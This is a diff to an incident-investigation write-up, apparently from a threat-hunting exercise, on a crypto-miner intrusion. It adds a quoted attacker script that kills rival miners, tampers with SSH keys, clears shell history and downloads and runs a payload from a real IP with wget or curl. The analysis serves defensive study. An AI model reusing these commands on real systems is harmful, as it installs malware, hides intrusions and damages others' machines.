@@ -246,6 +246,41 @@ Miner
 **SHA256:**
 --The SHA256 hash provided (59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4) refers to the binary or script identified in this incident, useful for file identification in threat databases.
 
+This would be followed by a sequence of commands from the script designed to extract valid user accounts from the system and manipulate data for further use in an attack, and another script performing several actions related to system manipulation, persistence, and concealment. 
+
+![image](https://github.com/user-attachments/assets/486d37f4-8483-4fb1-9ef0-cd033ce2211e)
+```
+bash
+./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1
+crontab -r
+chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1
+cd /var/tmp
+chattr -iae /var/tmp/Documents/.diicot
+pkill Opera
+pkill cnrig
+pkill java
+killall java
+pkill xmrig
+killall cnrig
+killall xmrig
+cd /var/tmp/
+mv /var/tmp/diicot /var/tmp/Documents/.diicot
+mv /var/tmp/kuak /var/tmp/Documents/kuak
+cd /var/tmp/Documents
+chmod +x .*
+/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown
+history -c
+rm -rf .bash_history ~/.bash_history
+rm -rf /tmp/cache
+cd /tmp/
+wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu
+mv .balu cache
+chmod +x cache
+./cache >/dev/null 2>&1 & disown
+history -c
+rm -rf .bash_history ~/.bash_history"
+```
+
 ### 3. Analyzing File Events
 To understand the extent of the data compromise, I searched the DeviceFileEvents table for actions initiated by the attacker under the new user account chadwick.s. I discovered that the attacker accessed and likely stole a sensitive file named CRISPR-X__Next-Generation_Gene_Editing_for_Artificial_Evolution.pdf alognside other files in a zip file named gene_editing_papers, a high-value target that could indicate a larger espionage operation targeting proprietary research.
 
